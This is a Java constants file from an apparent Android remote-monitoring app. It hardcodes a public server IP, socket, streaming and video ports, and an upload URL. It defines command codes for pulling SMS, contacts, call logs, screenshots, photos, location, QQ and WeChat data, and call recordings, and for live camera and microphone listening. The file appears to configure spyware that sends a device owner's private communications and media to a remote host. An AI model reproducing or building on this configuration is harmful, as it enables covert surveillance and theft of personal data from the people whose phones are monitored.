package com.lfish.control.action.actiontool;

public class CommonDefine {
	//public static String SIP="192.168.1.103";
	public static String SIP = "121.199.21.123"; //socket地址
	public static int Sport = 9126;
	public static String UPLOADIP = "121.199.21.123:9166";//上传文件服务器地址
	//	public static String UPLOADIP="192.168.1.121:8090";
	public static String STREAMIP = "121.199.21.123";//流媒体服务器
	public static int STREAMPORT = 1935;//流媒体服务器端口
	//	public static String UPLOADIP="121.199.21.123:8080";
	public static String VIP = "121.199.21.123";//4.0版本以前的实时视频传输地址
	public static int Vport = 8585;//4.0版本以前的实时视频传输地址 port

	public static final String COT_INIT = "Init";
	public static final String COT_SHORTMESSAGE = "Sms";
	public static final String COT_CONTACTS = "Contact";
	public static final String COT_CALLLOG = "CallLog";
	public static final String COT_SCREEN = "Screen";
	public static final String COT_PHOTO = "Photo";
	public static final String COT_LOCATION = "Location";
	public static final String COT_CAMERA = "Camera";
	public static final String COT_SEND_SMS = "SendMsg";
	public static final String COT_INCOME_SMS = "ComeMsg";
	public static final String COT_FILEPATH = "File";
	public static final String COT_INSTALLED_APP = "App";
	public static final String COT_TENGXUN = "QQ";
	public static final String COT_WEBCHAT = "Weixin";
	public static final String COT_TENGXUN_SD = "QQsd"; // QQsdcard
	public static final String COT_WEBCHAT_SD = "Weixinsd"; // weixinsdcard
	public static final String COT_CALLREC = "CallRecord";
	public static final String COT_REC = "Record";
	public static final String COT_VIDEO = "Video";
	public static final String COT_SNAPSHOT = "Snapshot";
	public static final String COT_CAMERALISTEN = "CameraOnline";
	public static final String COT_VOICELISTEN = "VoiceOnline";
	public static final String UPLOAD_FILES_URL = "http://" + UPLOADIP + "/upload";

	public static final String SOCKET_ACTION = "com.mysocket.useraciton";
	public static final String SEND_ACTION = "com.mysocket.sendaciton";
	public static final String ONLINE_ACTION = "com.myonline.useraciton";
}